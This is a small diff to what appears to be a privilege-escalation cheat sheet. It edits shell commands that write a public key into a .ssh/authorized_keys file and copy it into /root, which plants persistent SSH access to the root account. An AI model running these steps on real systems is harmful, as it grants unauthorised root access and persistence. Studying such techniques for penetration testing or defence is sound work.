@@ -630,9 +630,7 @@ nmap --interactive
 
 auto-privesc below
 
-mkdir /dev/shm/.ssh
-touch /dev/shm/.ssh/authorized_keys
-echo "<public_key_data>" > /dev/shm/.ssh/authorized_keys
-cd /dev/shm
+mkdir .ssh
+echo "<public_key_here>" > .ssh/authorized_keys
 cp --parents .ssh/authorized_keys /root
 ```
